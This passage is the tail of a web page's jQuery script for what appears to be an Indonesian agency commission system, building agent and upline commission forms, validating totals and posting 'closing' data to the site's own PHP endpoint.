                                                        '<label class="col-sm-4 control-label" align="right">ID Agent :</label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<input class="form-control" id="idAgent'+i+'" disabled="">'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right"></label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<div class="input-group" disabled>'+
                                                                '<span class="input-group-addon">Rp</span>'+
                                                                '<input type="text" id="komisiPA'+i+'" class="form-control" disabled="">'+
                                                            '</div>'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right">Upline 1 :</label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<input class="form-control" id="idUP1'+i+'" disabled="">'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right"></label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<div class="input-group" disabled>'+
                                                                '<span class="input-group-addon">Rp</span>'+
                                                                '<input type="text" id="komisiPUP1'+i+'" class="form-control" disabled="">'+
                                                            '</div>'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right">Upline 2 :</label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<input class="form-control" id="idUP2'+i+'" disabled="">'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right"></label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<div class="input-group" disabled>'+
                                                                '<span class="input-group-addon">Rp</span>'+
                                                                '<input type="text" id="komisiPUP2'+i+'" class="form-control" disabled="">'+
                                                            '</div>'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right">Upline 3 :</label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<input class="form-control" id="idUP3'+i+'" disabled="">'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right"></label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<div class="input-group" disabled>'+
                                                                '<span class="input-group-addon">Rp</span>'+
                                                                '<input type="text" id="komisiPUP3'+i+'" class="form-control" disabled="">'+
                                                            '</div>'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right">Vice Principal :</label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<input class="form-control" id="idVicePrincipal'+i+'" disabled="">'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right"></label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<div class="input-group" disabled>'+
                                                                '<span class="input-group-addon">Rp</span>'+
                                                                '<input type="text" id="komisiPVP'+i+'" class="form-control" disabled="">'+
                                                            '</div>'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right">Principal :</label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<input class="form-control" id="idPrincipal'+i+'" disabled="">'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
                                                        '<label class="col-sm-4 control-label" align="right"></label>'+
                                                        '<div class="col-sm-4">'+
                                                            '<div class="input-group" disabled>'+
                                                                '<span class="input-group-addon">Rp</span>'+
                                                                '<input type="text" id="komisiPP'+i+'" class="form-control" disabled="">'+
                                                            '</div>'+
                                                        '</div>'+
                                                    '</div>'+
                                                '</fieldset>'+
                                                '<div class="card-footer"></div>'+
                                            '</form>'+
                                        '</div>'+
                                    '</div>';
                                $("#semuaUpline").append(html);
                                $('#semuaUpline').slideDown().show();

                                $('#idAgent'+i).val(data[i].idA);
                                $('#komisiPA'+i).val(fGanti(+data[i].komisiA));

                                $('#idUP1'+i).val(data[i].idUP1);
                                $('#komisiPUP1'+i).val(fGanti(+data[i].kUP1));

                                $('#idUP2'+i).val(data[i].idUP2);
                                $('#komisiPUP2'+i).val(fGanti(+data[i].kUP2));

                                $('#idUP3'+i).val(data[i].idUP3);
                                $('#komisiPUP3'+i).val(fGanti(+data[i].kUP3));

                                $('#idPrincipal'+i).val(data[i].idP);
                                $('#komisiPP'+i).val(fGanti(+data[i].kP));

                                $('#idVicePrincipal'+i).val(data[i].idVP);
                                $('#komisiPVP'+i).val(fGanti(+data[i].kVP));

                            }
                            
                        },
                        error: function (jqXHR, exception) {
                            var msg = '';
                            if (jqXHR.status === 0) {
                                msg = 'Not connect.\n Verify Network.';
                            } else if (jqXHR.status == 404) {
                                msg = 'Requested page not found. [404]';
                            } else if (jqXHR.status == 500) {
                                msg = 'Internal Server Error [500].';
                            } else if (exception === 'parsererror') {
                                msg = 'Requested JSON parse failed.';
                            } else if (exception === 'timeout') {
                                msg = 'Time out error.';
                            } else if (exception === 'abort') {
                                msg = 'Ajax request aborted.';
                            } else {
                                msg = 'Uncaught Error.\n' + jqXHR.responseText;
                            }
                            swal(msg);
                        },
                      });
                    
                }else{
                    $.notify({
                        // options
                        icon: 'glyphicon glyphicon-exclamation-sign',
                        message: 'Maaf, data closing gagal untuk disimpan. Silahkan cek kembali.' 
                    },{
                        // settings
                        type: 'danger',
                        placement: {
                            from: "top",
                            align: "center"
                        },
                    });
                }
            });

            $('#simpanID').click(function(event){
                $('form').each(function(){

                    $(this).validate({
                        rules: {
                            '.form-control':{
                                required:true
                            }
                        }
                    });
                    $.validator.setDefaults({
                        highlight: function(element) {
                            $(element).closest('.form-group').addClass('has-error');
                        },
                        unhighlight: function(element) {
                            $(element).closest('.form-group').removeClass('has-error');
                        },
                        errorElement: 'span',
                        errorClass: 'help-block',
                        errorPlacement: function(error, element) {
                            if(element.parent('.input-group').length) {
                                error.insertAfter(element.parent());
                            } else {
                                error.insertAfter(element);
                            }
                        }
                    });
                });
                var isvalidate= false;
                var unitA=[];
                var unitB=[];
                var agentA=[];
                $('form input[id*=unit]').each(function(){
                    unitA.push(+$(this).val());
                });
                $('form input[id*=jumlah_komisi]').each(function(){
                    unitB.push(+fSplit($(this).val()));
                });
                    var sumU = unitA.reduce(add, 0);
                    var sumK = unitB.reduce(add, 0);
                    function add(a, b) {
                        return a + b;
                    } 
                $('form select[id*=id] option:selected').each(function(){
                    agentA.push($(this).val());
                });
                    function cek(a){
                        var v=0;
                        for(var i=0; i<a.length;i++){
                            for(var j=0; j<a.length;j++){
                                if(a[i] == a[j]){
                                    v+=1;
                                }
                            }
                        }
                        return v;
                    }
                $('form').each(function(){
                    isvalidate = $(this).valid();
                    if(cek(agentA) > agentA.length){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Id agent tidak boleh sama.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if(sumK > Tkomisi){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Total jumlah komisi tidak boleh melebihi Rp.'+Tkomisi+'.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if((Tkomisi-sumK) > 0){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Komisi sisa Rp.'+(Tkomisi-sumK)+'.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if(sumU > 1){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Total jumlah unit tidak boleh melebihi 1.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if(isvalidate == false){
                        return isvalidate=false;
                    }
                });
                if(isvalidate){
                    event.preventDefault();

                    $.ajax({
                        type: 'post',
                        url: 'proses.php?cmd=closing',
                        data: $('form').serialize(),
                        success: function (data) {
                            if(data == '1'){
                                $.notify({
                                    // options
                                    icon: 'glyphicon glyphicon-exclamation-sign',
                                    message: 'Maaf, data closing gagal untuk disimpan. Karena pada tanggal tersebut agen belum masuk.' 
                                },{
                                    // settings
                                    type: 'danger',
                                    placement: {
                                        from: "top",
                                        align: "center"
                                    },
                                });
                            }else{
                                localStorage.setItem("Status", 1);
                                location.reload();
                            }
                        }
                      });
                }else{
                    $.notify({
                        // options
                        icon: 'glyphicon glyphicon-exclamation-sign',
                        message: 'Maaf, data closing gagal untuk disimpan. Silahkan cek kembali.' 
                    },{
                        // settings
                        type: 'danger',
                        placement: {
                            from: "top",
                            align: "center"
                        },
                    });
                }
            });
            
        });      
    </script>

</html>
